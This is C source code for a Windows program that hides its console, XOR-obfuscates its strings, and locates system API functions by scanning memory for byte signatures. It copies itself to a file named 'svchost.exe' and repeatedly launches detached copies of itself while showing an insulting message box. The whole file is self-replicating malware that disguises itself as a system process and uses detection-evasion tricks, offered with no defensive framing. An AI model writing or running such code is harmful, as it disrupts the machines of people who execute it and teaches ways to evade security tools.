#include <Windows.h>
#include <Psapi.h>

#define XXX(xx) x_x(xx, (sizeof(xx) - 1))
#define ZZZ(zz) zz, sizeof(zz)

struct p { byte _[24]; };
struct s { byte _[104]; };
static char X_X[256] = { 0 };

/* xor decoder */
byte *x_x(byte *x, size_t z) {
    memset(X_X, 0, sizeof(X_X)); memcpy(X_X, x, z);
    for (size_t i = 0; i < z; i++) {
        i[X_X] ^= 'X';
    } return X_X;
}

/* signature compare */
void *y_y(byte *ptr, size_t bound, const byte *s, size_t ss) {
    if (NULL == ptr || NULL == s) { return NULL; }
    if ((uintptr_t) ptr + ss > (uintptr_t) (ptr + bound)) { return NULL; }

    for (size_t i = 0; i < ss; i++) {
        if (s[i] != ptr[i]) { return NULL; }
    } return ptr;
}

/* signature scanner instead of GetProcAddress(), cuz why not lmao */
void *z_z(void *h, size_t s, byte *_z, size_t _sz) {
    void *z = NULL;
    if (NULL == h) { return NULL; }
    for (size_t i = 0; i < s; i++) {
        if (NULL != y_y((byte *) ((byte *) h + i), s, _z, (_sz - 1))) {
            return (void *) ((byte *) h + i);
        }
    } return NULL;
}

/* self-replication */
void _(void *xp, void *zp) {
    char dir[256] = { 0 };
    struct s __s = { 0 };
    struct p __p = { 0 };
    byte _1[] = "XXXX";
    byte Z[] = { 0x14, 0x15, 0x19, 0x17 };
    GetCurrentDirectoryA(sizeof(dir), dir);
    for (size_t i = 0; i < sizeof(Z); i++) { i[_1] ^= i[Z]; }

    /* CreateProcessA("svchost.exe", NULL, NULL, NULL, FALSE, DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP, NULL, dir, &__s, &__p); */
    (*(BOOL(*)(LPCSTR l, LPSTR lc, void *sap, void *tap, BOOL ih, DWORD cf, void *lpe, LPCSTR lpcd, void *sa, void *pi))zp)
        (XXX("\x2b\x2e\x3b\x30\x37\x2b\x2c\x76\x3d\x20\x3d"), NULL, NULL, NULL, FALSE, 0x8 | 0x200, NULL, dir, &__s, &__p);
    /* MessageBoxA(NULL, "YOU ARE AN IDIOT", "LMAO", MB_OK | MB_ICONWARNING); */
    (*(int (*)(void *h, LPCSTR l, LPCSTR lp, UINT u))xp)(NULL, XXX("\x01\x17\x0d\x78\x19\x0a\x1d\x78\x19\x16\x78\x11\x1c\x11\x17\x0c"), _1, 0x0L | 0x30L);
}

int main(int argc, const char *argv[]) {
    ShowWindow(GetConsoleWindow(), 0x0);
    void *x = NULL, *y = NULL, *z = NULL;
    MODULEINFO u_m = { 0 }, u_k = { 0 };
    HMODULE u_h = GetModuleHandleA(XXX("\x2d\x2b\x3d\x2a\x6b\x6a\x76\x3c\x34\x34"));            /* user32.dll */
    HMODULE k_h = GetModuleHandleA(XXX("\x33\x3d\x2a\x36\x3d\x34\x6b\x6a\x76\x3c\x34\x34"));    /* kernel32.dll */
    if (NULL == u_h || NULL == k_h) { return EXIT_FAILURE; }
    if (!K32GetModuleInformation(GetCurrentProcess(), u_h, &u_m, sizeof(u_m))) { return EXIT_FAILURE; }
    if (!K32GetModuleInformation(GetCurrentProcess(), k_h, &u_k, sizeof(u_k))) { return EXIT_FAILURE; }
    /* MessageBoxA() */
    x = z_z(u_h, u_m.SizeOfImage, ZZZ("\x48\x83\xec\x38\x45\x33\xdb\x44\x39\x1d\xd2\x86\x03\x00\x74\x2e\x65\x48\x8b\x04\x25\x30\x00\x00\x00\x4c\x8b\x50\x48\x33\xc0\xf0"));
    /* CopyFileA() */
    y = z_z(k_h, u_k.SizeOfImage, ZZZ("\x48\x89\x5c\x24\x08\x48\x89\x74\x24\x10\x57\x48\x83\xec\x50\x48\x8b\xfa\x41\x8b\xf0\x48\x8b\xd1\x48\x8d\x4c\x24\x40\xe8\xbe\xa0"));
    /* CreateProcessA() */
    z = z_z(k_h, u_k.SizeOfImage, ZZZ("\x4c\x8b\xdc\x48\x83\xec\x58\x48\x8b\x84\x24\xa8\x00\x00\x00\x49\x89\x43\xf0\x48\x8b\x84\x24\xa0\x00\x00\x00\x49\x89\x43\xe8\x48\x8b\x84\x24\x98\x00\x00\x00\x49\x89\x43\xe0\x48\x8b\x84\x24\x90\x00\x00\x00\x49\x89\x43\xd8\x8b\x84\x24\x88\x00\x00\x00\x89\x44\x24\x28\x8b\x84\x24\x80\x00\x00\x00\x89\x44\x24\x20\x48\xff\x15\xec\x63\x06\x00\x0f\x1f\x44\x00\x00\x48\x83\xc4\x58\xc3"));
    if (NULL == x || NULL == y || NULL == z) { return EXIT_FAILURE; }

    /* copy argv[0] to "svchost.exe" */
    (*(BOOL(*)(const char *c, const char *n, BOOL b))y)(argv[0], XXX("\x2b\x2e\x3b\x30\x37\x2b\x2c\x76\x3d\x20\x3d"), TRUE);

    for (UINT i = 0; i < 2; i++) { _(x, z); }

    CloseHandle(u_h);
    CloseHandle(k_h);
    return EXIT_SUCCESS;
}
